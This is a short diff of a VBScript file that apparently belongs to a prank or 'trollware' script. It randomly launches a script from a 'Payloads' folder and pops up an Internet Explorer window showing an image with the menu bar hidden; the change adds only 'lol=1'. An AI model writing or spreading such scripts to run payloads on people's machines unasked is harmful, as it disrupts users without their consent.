@@ -17,6 +17,7 @@ a = int(rnd * 57 + 1)
 
 if a = 33 or a=55 or a=57 or a=12 or a=35 or a=20 then
 Eval2 ".\Payloads\Base64ToImage\Base64ToImage.vbs"
+lol=1
 set ie = CreateObject("InternetExplorer.Application")
 ie.navigate createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path+"\chara.jpg"
 ie.menubar=0
